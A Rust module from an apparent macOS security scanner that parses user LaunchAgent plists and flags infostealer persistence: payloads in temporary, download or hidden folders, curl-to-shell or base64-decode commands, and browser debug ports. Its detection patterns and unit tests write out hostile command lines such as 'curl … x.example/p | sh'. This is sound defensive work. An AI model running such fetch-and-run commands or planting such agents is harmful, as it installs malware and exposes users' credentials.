//! Suspicious user LaunchAgents: the persistence step of malicious npm and MCP
//! packages (SafeDep @copilot-mcp/apex,
//! https://safedep.io/malicious-copilot-mcp-apex-npm-macos-infostealer/ ;
//! MITRE ATT&CK T1543.001, https://attack.mitre.org/techniques/T1543/001/).
//! Reads plist files only; never runs launchctl or codesign.

use std::path::{Path, PathBuf};

use crate::models::{Category, Finding, Inspection, ScanContext, Severity};

pub const LAUNCH_AGENTS_SUB_CATEGORY: &str = "Login items (LaunchAgents)";

/// The parts of a LaunchAgent plist the rules read.
#[derive(Debug, Default, PartialEq)]
pub struct Agent {
    pub label: String,
    /// `Program`, else `ProgramArguments[0]`, followed by the remaining arguments.
    pub argv: Vec<String>,
    pub run_at_load: bool,
    pub start_interval: Option<u64>,
}

/// One rule match: finding id, severity, and the reason in plain words.
type Hit = (&'static str, Severity, String);

/// Vendors whose agents legitimately restart often or live in dot folders.
/// Only the soft rules are skipped: a payload in /tmp is flagged whatever the label.
const VENDOR_LABEL_PREFIXES: &[&str] = &[
    "com.google.keystone",
    "com.google.googleupdater",
    "com.adobe.",
    "com.docker.",
    "com.1password.",
    "com.agilebits.",
    "homebrew.mxcl.",
    "com.jetbrains.",
    "com.microsoft.",
];

/// Dot folders where package managers install developer tools.
const TOOL_DOT_DIRS: &[&str] = &[
    ".cargo/",
    ".rustup/",
    ".nvm/",
    ".volta/",
    ".bun/",
    ".deno/",
    ".local/bin/",
    ".asdf/",
    ".pyenv/",
    ".rbenv/",
    ".sdkman/",
    ".docker/",
    ".orbstack/",
    ".colima/",
    ".fnm/",
    ".npm-global/",
    ".local/share/mise/",
];

const INTERPRETERS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "python",
    "python3",
    "node",
    "ruby",
    "perl",
    "osascript",
];
const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh"];

pub fn parse_agent(bytes: &[u8]) -> Option<Agent> {
    let value = plist::Value::from_reader(std::io::Cursor::new(bytes)).ok()?;
    let dict = value.as_dictionary()?;
    let text = |k: &str| dict.get(k).and_then(|v| v.as_string()).map(str::to_string);
    let mut argv: Vec<String> = dict
        .get("ProgramArguments")
        .and_then(|v| v.as_array())
        .map(|a| {
            a.iter()
                .filter_map(|v| v.as_string().map(str::to_string))
                .collect()
        })
        .unwrap_or_default();
    if let Some(program) = text("Program") {
        // launchd runs Program; ProgramArguments then only supplies argv, argv[0] included.
        if argv.is_empty() {
            argv.push(program);
        } else {
            argv[0] = program;
        }
    }
    Some(Agent {
        label: text("Label").unwrap_or_default(),
        argv,
        run_at_load: dict.get("RunAtLoad").and_then(|v| v.as_boolean()) == Some(true),
        start_interval: dict
            .get("StartInterval")
            .and_then(|v| v.as_unsigned_integer()),
    })
}

fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// Why `path` is a suspicious place for a login item's program, if it is.
fn suspicious_place(path: &str, home: &Path, vendor: bool) -> Option<&'static str> {
    let home = home.to_string_lossy();
    let rel = path
        .strip_prefix(home.as_ref())
        .and_then(|r| r.strip_prefix('/'));
    if ["/tmp/", "/private/tmp/", "/var/tmp/", "/private/var/tmp/"]
        .iter()
        .any(|t| path.starts_with(t))
    {
        return Some("a temporary folder");
    }
    if rel.is_some_and(|r| r.starts_with("Downloads/")) {
        return Some("the Downloads folder");
    }
    let hidden = rel.is_some_and(|r| {
        r.split('/').rev().skip(1).any(|seg| seg.starts_with('.'))
            && !TOOL_DOT_DIRS.iter().any(|d| r.starts_with(d))
    });
    (hidden && !vendor).then_some("a hidden folder")
}

pub fn check_agent(agent: &Agent, home: &Path) -> Vec<Hit> {
    let mut hits = Vec::new();
    let Some(exe) = agent.argv.first() else {
        return hits;
    };
    let label = agent.label.to_ascii_lowercase();
    let vendor = VENDOR_LABEL_PREFIXES.iter().any(|p| label.starts_with(p));
    let args = &agent.argv[1..];
    let shell_script = (SHELLS.contains(&basename(exe)))
        .then(|| {
            args.iter()
                .position(|a| a == "-c")
                .and_then(|i| args.get(i + 1))
        })
        .flatten();

    // What actually runs: the program, or the script an interpreter is given.
    let mut runs = vec![exe.as_str()];
    if INTERPRETERS.contains(&basename(exe)) && shell_script.is_none() {
        if let Some(script) = args.iter().find(|a| !a.starts_with('-')) {
            runs.push(script);
        }
    }
    if let Some(script) = shell_script {
        runs.extend(script.split_whitespace().filter(|t| t.starts_with('/')));
    }
    if let Some((path, place)) = runs
        .iter()
        .find_map(|p| suspicious_place(p, home, vendor).map(|w| (*p, w)))
    {
        hits.push((
            "launch-agent-suspicious-path",
            Severity::High,
            format!("It starts {path} from {place} every time you log in. Legitimate apps install their helpers in /Applications, /Library or ~/Library/Application Support."),
        ));
    }

    if let Some(script) = shell_script {
        let s = script.to_ascii_lowercase();
        let fetch_to_shell = (s.contains("curl") || s.contains("wget"))
            && [
                "| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh", "eval", "$(curl", "$(wget",
            ]
            .iter()
            .any(|p| s.contains(p));
        let decode =
            s.contains("base64 -d") || s.contains("base64 --decode") || s.contains("base64 -D");
        if fetch_to_shell || decode || s.contains("osascript") {
            hits.push((
                "launch-agent-shell-download",
                Severity::High,
                "Its shell command downloads or decodes code and runs it, or drives osascript. This is how infostealers re-run themselves at login.".into(),
            ));
        }
    }

    if agent
        .argv
        .iter()
        .any(|a| a.contains("--remote-debugging-port"))
    {
        hits.push((
            "launch-agent-browser-debug-port",
            Severity::High,
            "It starts a browser with --remote-debugging-port, which lets any local program read your open sessions and cookies.".into(),
        ));
    }

    if hits.is_empty()
        && !vendor
        && agent.run_at_load
        && agent.start_interval.is_some_and(|i| i <= 60)
    {
        hits.push((
            "launch-agent-frequent-restart",
            Severity::Medium,
            format!(
                "It runs at login and again every {} seconds. Check that you know what it is.",
                agent.start_interval.unwrap_or_default()
            ),
        ));
    }
    hits
}

pub fn scan_launch_agents(ctx: &ScanContext) -> (Vec<Finding>, Vec<Inspection>) {
    let home = std::env::var_os("MACFLOW_HOME")
        .or_else(|| std::env::var_os("HOME"))
        .map(PathBuf::from);
    scan_launch_agents_with_home(ctx, home.as_deref())
}

pub fn scan_launch_agents_with_home(
    ctx: &ScanContext,
    home: Option<&Path>,
) -> (Vec<Finding>, Vec<Inspection>) {
    let one = |i: Inspection| (Vec::new(), vec![i]);
    let skip = |reason| {
        one(Inspection::skipped(
            Category::Security,
            Some(LAUNCH_AGENTS_SUB_CATEGORY),
            Some(reason),
        ))
    };
    if !ctx.is_category_selected(Category::Security) {
        return skip("category not selected");
    }
    let Some(home) = home else {
        return skip("home directory unavailable");
    };
    let dir = home.join("Library/LaunchAgents");
    let mut plists: Vec<PathBuf> = std::fs::read_dir(&dir)
        .into_iter()
        .flatten()
        .filter_map(|e| e.ok().map(|e| e.path()))
        .filter(|p| p.extension().is_some_and(|x| x == "plist") && p.is_file())
        .collect();
    if plists.is_empty() {
        return one(Inspection::inspected(
            Category::Security,
            Some(LAUNCH_AGENTS_SUB_CATEGORY),
            "user (no LaunchAgents)",
        ));
    }
    plists.sort();

    // Findings carry the inspection's scope so the report files them under it.
    let scope = format!("user ({} LaunchAgents)", plists.len());
    let mut findings = Vec::new();
    let mut inspections = vec![Inspection::inspected(
        Category::Security,
        Some(LAUNCH_AGENTS_SUB_CATEGORY),
        scope.clone(),
    )];
    for path in &plists {
        let shown = path.to_string_lossy();
        let Some(agent) = std::fs::read(path).ok().and_then(|b| parse_agent(&b)) else {
            inspections.push(Inspection::unparseable(
                Category::Security,
                Some(LAUNCH_AGENTS_SUB_CATEGORY),
                Some(shown.as_ref()),
                "not a readable property list",
            ));
            continue;
        };
        let label = if agent.label.is_empty() {
            path.file_stem()
                .map(|s| s.to_string_lossy().into_owned())
                .unwrap_or_default()
        } else {
            agent.label.clone()
        };
        for (id, severity, why) in check_agent(&agent, home) {
            findings.push(
                Finding::new(
                    id,
                    format!("Login item {label} looks like malware persistence"),
                    Category::Security,
                    severity,
                    why,
                )
                .with_sub_category(LAUNCH_AGENTS_SUB_CATEGORY)
                .with_scope(scope.clone())
                .with_location(shown.as_ref(), None)
                .with_remediation(format!(
                    "If you do not recognise it, unload it with `launchctl bootout gui/$(id -u)/{label}`, then delete {shown} and the program it starts, and rotate the tokens that were on this Mac (GitHub, npm, cloud and AI keys)."
                )),
            );
        }
    }
    (findings, inspections)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::InspectionStatus;
    use std::fs;
    use std::sync::atomic::{AtomicU64, Ordering};

    fn tmp() -> PathBuf {
        static N: AtomicU64 = AtomicU64::new(0);
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let n = N.fetch_add(1, Ordering::Relaxed);
        let p = std::env::temp_dir().join(format!("la_{}_{n}_{nanos}", std::process::id()));
        fs::create_dir_all(&p).unwrap();
        p
    }

    fn plist(label: &str, args: &[&str], extra: &str) -> String {
        let args: String = args
            .iter()
            .map(|a| format!("<string>{a}</string>"))
            .collect();
        format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>{label}</string>
<key>ProgramArguments</key><array>{args}</array>
{extra}
</dict></plist>"#
        )
    }

    fn agent(args: &[&str]) -> Agent {
        Agent {
            label: "com.example.thing".into(),
            argv: args.iter().map(|s| s.to_string()).collect(),
            ..Agent::default()
        }
    }

    fn ids(hits: &[Hit]) -> Vec<&'static str> {
        hits.iter().map(|h| h.0).collect()
    }

    #[test]
    fn test_parses_xml_and_binary_plists() {
        let xml = plist(
            "com.example.a",
            &["/bin/sh", "-c", "echo hi"],
            "<key>RunAtLoad</key><true/><key>StartInterval</key><integer>30</integer>",
        );
        let a = parse_agent(xml.as_bytes()).expect("xml");
        assert_eq!(a.label, "com.example.a");
        assert_eq!(a.argv, vec!["/bin/sh", "-c", "echo hi"]);
        assert!(a.run_at_load);
        assert_eq!(a.start_interval, Some(30));

        // Same agent written as a binary plist.
        let value = plist::Value::from_reader_xml(xml.as_bytes()).unwrap();
        let mut bin = Vec::new();
        value.to_writer_binary(&mut bin).unwrap();
        assert!(bin.starts_with(b"bplist"));
        assert_eq!(parse_agent(&bin), Some(a));

        // Program plus ProgramArguments: Program is what runs.
        let p = r#"<plist version="1.0"><dict><key>Label</key><string>x</string>
<key>Program</key><string>/usr/local/bin/tool</string>
<key>ProgramArguments</key><array><string>tool</string><string>--flag</string></array></dict></plist>"#;
        assert_eq!(
            parse_agent(p.as_bytes()).unwrap().argv,
            vec!["/usr/local/bin/tool", "--flag"]
        );
        assert_eq!(
            parse_agent(b"<plist><dict><key>Label</key>&bad;</dict></plist>"),
            None
        );
    }

    #[test]
    fn test_payload_in_temp_downloads_or_hidden_dir_is_high() {
        let home = Path::new("/Users/dev");
        for args in [
            vec!["/tmp/.x/agent"],
            vec!["/private/tmp/update"],
            vec!["/bin/bash", "/var/tmp/run.sh"],
            vec!["/Users/dev/Downloads/helper"],
            // The Nx Console backdoor ran ~/.local/share/kitty/cat.py from a LaunchAgent.
            vec!["/usr/bin/python3", "/Users/dev/.local/share/kitty/cat.py"],
        ] {
            let hits = check_agent(&agent(&args), home);
            assert_eq!(ids(&hits), vec!["launch-agent-suspicious-path"], "{args:?}");
            assert_eq!(hits[0].1, Severity::High);
        }
    }

    #[test]
    fn test_shell_download_or_decode_and_chrome_debug_port_are_high() {
        let home = Path::new("/Users/dev");
        let sh = agent(&["/bin/zsh", "-c", "curl -fsSL https://x.example/p | sh"]);
        assert_eq!(
            ids(&check_agent(&sh, home)),
            vec!["launch-agent-shell-download"]
        );
        let b64 = agent(&["/bin/sh", "-c", "echo aGk= | base64 -d | sh"]);
        assert_eq!(
            ids(&check_agent(&b64, home)),
            vec!["launch-agent-shell-download"]
        );
        let osa = agent(&["/bin/bash", "-c", "osascript -e 'display dialog'"]);
        assert_eq!(
            ids(&check_agent(&osa, home)),
            vec!["launch-agent-shell-download"]
        );
        let chrome = agent(&[
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
            "--remote-debugging-port=9222",
        ]);
        let hits = check_agent(&chrome, home);
        assert_eq!(ids(&hits), vec!["launch-agent-browser-debug-port"]);
        assert_eq!(hits[0].1, Severity::High);
    }

    #[test]
    fn test_frequent_restart_is_medium_and_vendor_allowlist_only_skips_soft_rules() {
        let home = Path::new("/Users/dev");
        let mut beacon = agent(&["/Users/dev/bin/sync"]);
        beacon.run_at_load = true;
        beacon.start_interval = Some(60);
        let hits = check_agent(&beacon, home);
        assert_eq!(ids(&hits), vec!["launch-agent-frequent-restart"]);
        assert_eq!(hits[0].1, Severity::Medium);

        let mut keystone = agent(&["/Users/dev/Library/Google/GoogleSoftwareUpdate/ksinstall"]);
        keystone.label = "com.google.keystone.agent".into();
        keystone.run_at_load = true;
        keystone.start_interval = Some(30);
        assert!(check_agent(&keystone, home).is_empty());

        // A vendor-looking label does not excuse a payload in /tmp.
        let mut fake = agent(&["/tmp/GoogleUpdate"]);
        fake.label = "com.google.keystone.agent".into();
        assert_eq!(
            ids(&check_agent(&fake, home)),
            vec!["launch-agent-suspicious-path"]
        );
    }

    #[test]
    fn test_normal_developer_agents_are_quiet() {
        let home = Path::new("/Users/dev");
        let mut usage = agent(&[
            "/usr/bin/python3",
            "/Users/dev/projects/tools/bin/collect",
            "--days",
            "2",
        ]);
        usage.run_at_load = true;
        usage.start_interval = Some(3600);
        for a in [
            agent(&[
                "/bin/bash",
                "/Users/dev/projects/company/bin/run.sh",
                "build",
            ]),
            agent(&[
                "/opt/homebrew/opt/caddy/bin/caddy",
                "run",
                "--config",
                "/opt/homebrew/etc/Caddyfile",
            ]),
            agent(&[
                "/opt/homebrew/bin/autossh",
                "-M",
                "0",
                "-N",
                "-o",
                "ServerAliveInterval=30",
            ]),
            agent(&["/Users/dev/.cargo/bin/sccache", "--start-server"]),
            agent(&["/bin/sh", "-c", "/opt/homebrew/bin/brew update"]),
            usage,
        ] {
            assert!(check_agent(&a, home).is_empty(), "{a:?}");
        }
    }

    #[test]
    fn test_scan_reports_under_one_scope_and_unreadable_files() {
        let home = tmp();
        let dir = home.join("Library/LaunchAgents");
        fs::create_dir_all(&dir).unwrap();
        fs::write(
            dir.join("com.evil.plist"),
            plist("com.evil", &["/tmp/payload"], ""),
        )
        .unwrap();
        fs::write(
            dir.join("homebrew.mxcl.redis.plist"),
            plist(
                "homebrew.mxcl.redis",
                &["/opt/homebrew/opt/redis/bin/redis-server"],
                "",
            ),
        )
        .unwrap();
        fs::write(
            dir.join("broken.plist"),
            "<plist><dict>&nope;</dict></plist>",
        )
        .unwrap();
        fs::write(dir.join("notes.txt"), "not a plist").unwrap();

        let (f, i) = scan_launch_agents_with_home(&ScanContext::new(), Some(&home));
        assert_eq!(f.len(), 1, "{f:?}");
        let scope = "user (3 LaunchAgents)";
        assert_eq!(f[0].scope.as_deref(), Some(scope));
        assert_eq!(f[0].category, Category::Security);
        assert!(f[0].title.contains("com.evil"), "{}", f[0].title);
        let rem = f[0].remediation.as_deref().unwrap();
        assert!(
            rem.contains("launchctl bootout gui/$(id -u)/com.evil"),
            "{rem}"
        );
        assert!(i.iter().any(|x| x.status
            == InspectionStatus::Inspected {
                inspected_scope: scope.into()
            }));
        assert!(i
            .iter()
            .any(|x| matches!(x.status, InspectionStatus::UnparseableData { .. })));
    }

    #[test]
    fn test_no_folder_and_not_selected() {
        let home = tmp();
        let (f, i) = scan_launch_agents_with_home(&ScanContext::new(), Some(&home));
        assert!(f.is_empty());
        assert!(
            matches!(&i[0].status, InspectionStatus::Inspected { inspected_scope } if inspected_scope.contains("no LaunchAgents"))
        );
        let ctx = ScanContext::new().with_categories(vec![Category::Garbage]);
        let (_, i) = scan_launch_agents_with_home(&ctx, Some(&home));
        assert!(matches!(i[0].status, InspectionStatus::Skipped { .. }));
    }
}
